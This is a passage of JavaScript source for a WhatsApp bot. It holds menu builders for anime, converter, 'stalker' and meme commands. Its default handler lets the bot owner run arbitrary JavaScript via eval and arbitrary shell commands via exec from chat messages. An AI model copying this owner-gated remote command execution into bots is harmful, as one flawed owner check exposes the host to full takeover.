   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *A N I M E  M E N U*
☍ ${prefix}genshin
☍ ${prefix}akira
☍ ${prefix}akiyama
☍ ${prefix}ana
☍ ${prefix}asuna
☍ ${prefix}ayuzawa
☍ ${prefix}boruto
☍ ${prefix}chitoge
☍ ${prefix}deidara
☍ ${prefix}doraemon
☍ ${prefix}elaina
☍ ${prefix}emilia
☍ ${prefix}erza
☍ ${prefix}gremory
☍ ${prefix}hestia
☍ ${prefix}hinata
☍ ${prefix}inori
☍ ${prefix}isuzu
☍ ${prefix}itachi
☍ ${prefix}itori
☍ ${prefix}kaga
☍ ${prefix}kagura
☍ ${prefix}kakasih
☍ ${prefix}kaori
☍ ${prefix}keneki
☍ ${prefix}kotori
☍ ${prefix}kurumi
☍ ${prefix}loli
☍ ${prefix}madara
☍ ${prefix}mikasa
☍ ${prefix}miku
☍ ${prefix}minato
☍ ${prefix}naruto
☍ ${prefix}nezuko
☍ ${prefix}onepiece
☍ ${prefix}sakura
☍ ${prefix}sasuke
☍ ${prefix}shina
☍ ${prefix}shinka
☍ ${prefix}shizuka
☍ ${prefix}shota
☍ ${prefix}toukachan
☍ ${prefix}tsunade
☍ ${prefix}yuki`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'convertmenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *C O N V E R T  M E N U*
☍ ${prefix}stiker
☍ ${prefix}swm
☍ ${prefix}smeme
☍ ${prefix}emojimix
☍ ${prefix}emojimix2
☍ ${prefix}toimage
☍ ${prefix}tomp4
☍ ${prefix}toaudio
☍ ${prefix}tomp3
☍ ${prefix}tovn
☍ ${prefix}togif
☍ ${prefix}tourl`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'stalkmenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *S T A L K E R  M E N U*
☍ ${prefix}igstalk
☍ ${prefix}ttstalk
☍ ${prefix}mlstalk
☍ ${prefix}ghstalk
☍ ${prefix}twstalk`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'mememenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *M E M E  M E N U*
☍ ${prefix}darkjoke
☍ ${prefix}ramdommeme
☍ ${prefix}memeindo`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break



            default:
                if (!isCmd) {
                    if (command)
                    newReply("DiMohon Jangan Spam!!!!")
                sleep(5000)
                }
                
                if (budy.startsWith('=>')) {
                    if (!isCreator) return newReply(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return newReply(bang)
                    }
                    try {
                        newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        newReply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return newReply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await newReply(evaled)
                    } catch (err) {
                        await newReply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return newReply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return newReply(err)
                        if (stdout) return newReply(stdout)
                    })
                }
                
                if (isCmd && budy.toLowerCase() != undefined) {
                    if (m.chat.endsWith('broadcast')) return
                    if (m.isBaileys) return
                    let msgs = global.db.data.database
                    if (!(budy.toLowerCase() in msgs)) return
                    conn.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
                }
        }


    } catch (err) {
        console.log("Eror Di Bagian adrian.js "+util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})